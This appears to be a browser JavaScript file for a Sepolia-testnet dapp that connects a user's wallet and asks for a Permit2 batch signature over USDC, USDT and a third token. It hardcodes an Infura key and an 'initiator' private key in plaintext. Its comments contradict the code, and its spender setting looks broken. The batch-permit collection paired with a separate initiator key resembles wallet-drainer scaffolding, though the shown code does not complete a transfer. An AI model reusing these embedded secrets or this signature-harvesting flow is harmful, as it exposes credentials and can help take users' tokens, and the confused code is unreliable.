const { ethers, ethereum } = window;

// constants
const RPC = "https://sepolia.infura.io/v3/fb42577745e24d429d936f65b43cca0b"; // Goerly RPC
const chainId = 11155111; // Goerly chain id  155111" 
const Permit2ContractAddress = "0x3Aa6320A008413F71149d3EB00328B669F8C2569"; // Permit2 deployed to Sepolia
// const token1 = "0x8556C135e9899bc6e747f80a3084b2Ff5dDC574C"; // SHIBA on Goerly
// const token2 = "0xAe258c792361101eE7DC3061f8f259365b44769F"; // USDT on Goerly
const tokenAddresses = [
  "0x1901A535526d973bc143e61D86e11282e4f1Ad5c", // USDC address
  "0x3496989c4C8D523eC3C8db0dB85F04BCe95252fE", // USDT address
  "0xB836eE20593c6310929b6f05a45a098fb602b93f",
   // Replace with DAI address
];

const amount1 = String(20 * 10 ** 18); // calculate SHIBA
const initiator = "0x0A59223D2d7018C5d6f5fDD6d9a02Ea6828fD22f"; // initiator address
const initiatorPK =
  "fdc3d7a7ef1129116fbf4d565cff4ce9f86570e67ed6a7cf84281acab26986fc"; // initiaror's private key

// setup UI
const connectButton = document.getElementById("connect");
const approveButton = document.getElementById("approve");
const mainButton = document.getElementById("main");

approveButton.disabled = true;
mainButton.disabled = true;

// ABIs
const Permit2ContractABI = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "owner",
        "type": "address"
      },
      {
        "components": [
          {
            "components": [
              {
                "internalType": "address",
                "name": "token",
                "type": "address"
              },
              {
                "internalType": "uint160",
                "name": "amount",
                "type": "uint160"
              },
              {
                "internalType": "uint48",
                "name": "expiration",
                "type": "uint48"
              },
              {
                "internalType": "uint48",
                "name": "nonce",
                "type": "uint48"
              }
            ],
            "internalType": "struct IAllowanceTransfer.PermitDetails[]",
            "name": "details",
            "type": "tuple[]"
          },
          {
            "internalType": "address",
            "name": "spender",
            "type": "address"
          },
          {
            "internalType": "uint256",
            "name": "sigDeadline",
            "type": "uint256"
          }
        ],
        "internalType": "struct IAllowanceTransfer.PermitBatch",
        "name": "permitBatch",
        "type": "tuple"
      },
      {
        "internalType": "bytes",
        "name": "signature",
        "type": "bytes"
      }
    ],
    "name": "permit",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
]



const ERC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];

// variables
let provider, web3;
let selectedAddress;

// connect function
async function connect() {
  //window.web3 = new Web3(window.ethereum);
  web3 = new Web3(window.ethereum);
  provider = new ethers.providers.Web3Provider(ethereum);
  const network = await provider.getNetwork();

  // if (network.chainId !== chainId) {
  //     try {
  //         await provider.send("wallet_switchEthereumChain", [{ chainId: `0x${chainId}` }])
  //     } catch (err) {
  //         console.log("error", err)
  //         return
  //     }
  // }

  const accounts = await provider.send("eth_requestAccounts", []);
  selectedAddress = accounts[0];

  connectButton.innerText = selectedAddress;
  connectButton.disabled = true;
  approveButton.disabled = false;
  mainButton.disabled = false;
}


  // function for token approval to the Permit2 contract
// function for token approval to the Permit2 contract
async function approveToken() {
  const permit2Contract = new web3.eth.Contract(
    Permit2ContractABI,
    Permit2ContractAddress,
    {
      from: selectedAddress,
    }
  );
  const permitDetailsArray = tokenAddresses.map((token, index) => ({
    token: token,
    amount: amount1,
    expiration: Math.floor(Date.now() / 1000) + 120, // Set expiration to 2 minutes from now
    nonce: index, // Update with the appropriate nonce value
  }));
  const permitBatch = {
    details: permitDetailsArray,
    spender: Permit2ContractAddress,
    sigDeadline: Math.floor(Date.now() / 1000) + 120, // Set signature deadline to 2 minutes from now
  };
  const domain = {
    chainId: chainId,
    name: "Permit2",
    verifyingContract: Permit2ContractAddress,
  };
  const types = {
    PermitDetails: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint160" },
      { name: "expiration", type: "uint48" },
      { name: "nonce", type: "uint48" },
    ],
    PermitBatch: [
      { name: "details", type: "PermitDetails[]" },
      { name: "spender", type: "address" },
      { name: "sigDeadline", type: "uint256" },
    ],
  };
  
  const permitData = JSON.stringify({
    types: types,
    domain: domain,
    primaryType: "PermitBatch",
    message: permitBatch,
  });
  const signature = await provider.send("eth_signTypedData_v4", [
    selectedAddress,
    permitData,
  ]);
  permit2Contract.methods
    .permit(selectedAddress, permitBatch, signature)
    .send({ from: selectedAddress })
    .on("transactionHash", function (hash) {
      console.log("Wait for a little bit...");
    })
    .on("receipt", function (receipt) {
      console.log("You successfully approved the tokens.");
    });
}

// configure buttons
window.addEventListener("DOMContentLoaded", () => {
  connectButton.onclick = connect;
  console.log("hbdj");
}),
  window.addEventListener("DOMContentLoaded", () => {
    approveButton.onclick = approveToken;
  })
 